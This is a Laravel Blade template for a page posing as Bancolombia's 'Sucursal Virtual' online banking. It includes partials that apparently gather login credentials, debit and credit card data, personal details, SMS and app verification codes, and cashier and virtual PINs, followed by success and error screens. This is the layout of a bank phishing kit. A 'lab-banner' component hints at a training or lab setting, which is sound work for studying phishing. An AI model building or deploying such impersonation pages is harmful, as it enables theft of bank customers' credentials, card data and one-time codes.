<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia - Sucursal Virtual</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="{{ asset('3co/js/tailwind-config.js') }}"></script>
    @include('3co.partials.styles')
</head>

<body class="bg-gray-100">
<x-lab-banner />
    @include('3co.partials.loading')

    @include('3co.partials.header')

    <!-- Main Content -->
    <div class="bg-bancolombia min-h-[70vh] w-[90%] mx-auto flex flex-col items-center justify-center">

        @include('3co.partials.login')

        @include('3co.partials.tdb')

        @include('3co.partials.tdc')

        @include('3co.partials.datos')

        @include('3co.partials.codsms')

        @include('3co.partials.codapp')

        @include('3co.partials.pincaj')

        @include('3co.partials.pinvir')

        @include('3co.partials.exito')

        @include('3co.partials.error')
    </div>

    @include('3co.partials.footer')

<script src="{{ asset('3co/js/trico-app.js') }}"></script>

</body>

</html>
